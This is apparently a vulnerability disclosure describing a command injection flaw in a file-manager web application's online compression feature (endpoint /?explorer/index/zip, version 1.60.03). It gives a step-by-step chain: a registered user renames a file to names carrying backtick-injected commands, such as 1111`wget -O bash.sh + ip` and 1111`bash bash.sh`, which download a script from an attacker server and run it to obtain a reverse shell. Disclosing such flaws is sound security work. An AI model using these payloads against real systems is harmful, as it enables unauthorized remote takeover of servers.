**Remote Command Execution**

This is a latest version （1.60.03 release）
![](https://secure2.wostatic.cn/static/5U6P3EB3wmHKFg9qFt7Cx9/image.png?auth_key=1758786173-7mvoSSyaBn5fjWtpGDi1sR-0-c1e8d578b316ec3b6520ef2090a803e9)

Through the registration function, you can register a **normal account**

Enter your email address, the verification code you received, and the password you need to set. You can register a **normal account**

![](https://secure2.wostatic.cn/static/ip3dtWy71PcBTaT7upSbAh/image.png?auth_key=1758786174-fgz4YAfr6FkFNSfR4pUwzs-0-fbe945a5166842849e37b38327a43385)

After registration, you can log in with this registered normal account

![](https://secure2.wostatic.cn/static/KC5Us2DPQu8F1tFbFAjKc/image.png?auth_key=1758786174-hQ3NN2HCFkuLp5c2wxz2ci-0-f0ebf19617e76d7866182da6392ce553)

In "My Files", upload a file:

![](https://secure2.wostatic.cn/static/dHAheft4onUYa9BFirB42p/image.png?auth_key=1758786173-anpGG4ttE4gRLLfp2GfnnY-0-33de399e64c4f6d99cd24d39e07139f8)

Through the rename operation, the file is renamed to a name with attack vectors:

![](https://secure2.wostatic.cn/static/keguh7gw4R4yMf499Ss1yc/image.png?auth_key=1758786173-qmoxQwTGhfCeQ7MTmH2Uth-0-68a42e4486f2b8f8618c8cb18121e5e8)

set    1111 \`curl+ip\`  

![](https://secure2.wostatic.cn/static/rGQ7PP7D9bqoV4nNi2249K/image.png?auth_key=1758786174-fuqEKKThXn9gnPQJWpEynj-0-a5fba79b602be51d9ae1da736cc6e687)

Then perform online compression

![](https://secure2.wostatic.cn/static/ae3BdnZ587yoK9xKs796f7/image.png?auth_key=1758786173-unDys8WHLW53WRHHENz2WM-0-eb4bb3fd0e1e0ea8acb8fc90e8eb8224)

After the compression is completed, it can be found that the attack server has received an http request message, indicating that there is a command execution vulnerability

![](https://secure2.wostatic.cn/static/cWzCvHsDsMAfzXbAKKCcac/image.png?auth_key=1758786174-vi4cdPrN7keMAaNfmxmmiy-0-f7b0d50511fb166d8176aea974a56ea6)

Here is the request  for the compression function

use:     **/?explorer/index/zip**  

(PS:  You cannot modify the malicious command directly in this request packet, it is invalid. You must first modify it to include the malicious command file name, and then compress it.)

![](https://secure2.wostatic.cn/static/wqyx4QBV6xmAhS115CSNng/image.png?auth_key=1758786173-tvp9TndBbJiiu4HdHQLVvf-0-1be6dd4b9a42f28fdb674f9122cfc05c)

Next I will create a series of attack vectors，until my attack machine gains access to the server.

I created a simple flask server on my attack machine that can directly download bash.sh

![](https://secure2.wostatic.cn/static/2dix9D93fYHGEERMJSgoJp/image.png?auth_key=1758786174-rnp5K3CL8UrewXpfDATRb9-0-dd84dd4a0033eca231733fc1c13bbff9)

The bash.sh content is a reverse shell:

![](https://secure2.wostatic.cn/static/i5VWqpX7i8wHpcGz9aKbdj/image.png?auth_key=1758786173-wjMf2ujuhEPU8jcFk79G1M-0-ee73da1403ee70a1c790cd2c71c9e157)

Start this flask server on my attack machine

![](https://secure2.wostatic.cn/static/mHSqgtgsoHULeCBGqrJRA6/image.png?auth_key=1758786174-oZ5JXKTUE5CeuhB6bzx1Ez-0-d7bed4a692ee76e86cfbb07fca036b99)

Next rename the files in the following order and compress them one by one

![](https://secure2.wostatic.cn/static/t6vr5iKkRWw4nPxqq19pcV/image.png?auth_key=1758786174-iAWLzW3T2hQu29xUkEyzym-0-2aa1b8867194c7e8db2793bbff9795e4)

You can:

1.First change the file name to 1111\`wget -O bash.sh + ip\`, then compress it



2.Then change the file name to 1111\`bash bash.sh\` ,then compress it

![](https://secure2.wostatic.cn/static/oFJ7znVFCvmFJrRu68WsVC/image.png?auth_key=1758786174-oym21obfFoTFyvPzbY7vrR-0-0f502f8b3ca96d0de1b4101b6b6ca4dd)

After completing the above series of operations，

Finally my attacking machine receive a reverse shell:

![](https://secure2.wostatic.cn/static/hXTTLh57MiZY2Wmd2czMSL/image.png?auth_key=1758786174-7QX2QtDvsR7MTZgWsZ91f7-0-2be66432e8885ebfab50132607ae1b29)
